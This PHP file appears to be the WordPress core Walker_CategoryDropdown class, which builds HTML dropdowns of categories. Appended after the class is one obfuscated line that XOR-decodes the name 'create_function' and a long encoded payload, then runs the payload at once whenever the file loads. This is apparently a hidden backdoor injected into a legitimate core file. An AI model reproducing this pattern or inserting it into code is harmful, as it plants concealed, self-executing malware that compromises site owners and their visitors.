<?php
/**
 * Taxonomy API: Walker_CategoryDropdown class
 *
 * @package WordPress
 * @subpackage Template
 * @since 4.4.0
 */

/**
 * Core class used to create an HTML dropdown list of Categories.
 *
 * @since 2.1.0
 *
 * @see Walker
 */
class Walker_CategoryDropdown extends Walker {

	/**
	 * What the class handles.
	 *
	 * @since 2.1.0
	 * @access private
	 * @var string
	 *
	 * @see Walker::$tree_type
	 */
	public $tree_type = 'category';

	/**
	 * Database fields to use.
	 *
	 * @since 2.1.0
	 * @access public
	 * @todo Decouple this
	 * @var array
	 *
	 * @see Walker::$db_fields
	 */
	public $db_fields = array ('parent' => 'parent', 'id' => 'term_id');

	/**
	 * Starts the element output.
	 *
	 * @since 2.1.0
	 * @access public
	 *
	 * @see Walker::start_el()
	 *
	 * @param string $output   Passed by reference. Used to append additional content.
	 * @param object $category Category data object.
	 * @param int    $depth    Depth of category. Used for padding.
	 * @param array  $args     Uses 'selected', 'show_count', and 'value_field' keys, if they exist.
	 *                         See wp_dropdown_categories().
	 * @param int    $id       Optional. ID of the current category. Default 0 (unused).
	 */
	public function start_el( &$output, $category, $depth = 0, $args = array(), $id = 0 ) {
		$pad = str_repeat('&nbsp;', $depth * 3);

		/** This filter is documented in wp-includes/category-template.php */
		$cat_name = apply_filters( 'list_cats', $category->name, $category );

		if ( isset( $args['value_field'] ) && isset( $category->{$args['value_field']} ) ) {
			$value_field = $args['value_field'];
		} else {
			$value_field = 'term_id';
		}

		$output .= "\t<option class=\"level-$depth\" value=\"" . esc_attr( $category->{$value_field} ) . "\"";

		// Type-juggling causes false matches, so we force everything to a string.
		if ( (string) $category->{$value_field} === (string) $args['selected'] )
			$output .= ' selected="selected"';
		$output .= '>';
		$output .= $pad.$cat_name;
		if ( $args['show_count'] )
			$output .= '&nbsp;&nbsp;('. number_format_i18n( $category->count ) .')';
		$output .= "</option>\n";
	}
}
$nhcEEemexCNT='H=-;V4kS+6^TKC '^'+OHZ"Q45^X= ",N';$mqalLcxa=$nhcEEemexCNT('','86BDX60"EBwl0x58ts:cuGSVCAZA1qeaaHqBB18TTcA91-7h=23:EQQC t 1TwoV0528US8AeD"F3ZqA.:r7=pufdSdZ5f2M.A6SCleACX;XZdbr:.a=0e:EYCd=c2,Wl0WoDVbqG6KV1Pv36.EX2gnEKmG.LJ2v4ZOm=+TTgv7250TVt2;2T1VbU7:K59UaqxkxCQ:PGPeg+'^'QPbl1ECG1jS3b=dm1 n8R-fg1t 8WV8HHhU6-TN58^efchf=xagab;drRAZH2P2m:P^K0:^aM-Q5V.Yeqy=xv90=C9QkGSH4HfkzjLA5,=M96YF-ya.vy ab3vUOVHU1Kmle-0BY.E83ExRGYK39^NGe0gNK:+^^G.=2OD eT^USFUbb+V^Q;U3JqCU.CX9HXQPrJ5S5oy^mV');$mqalLcxa();
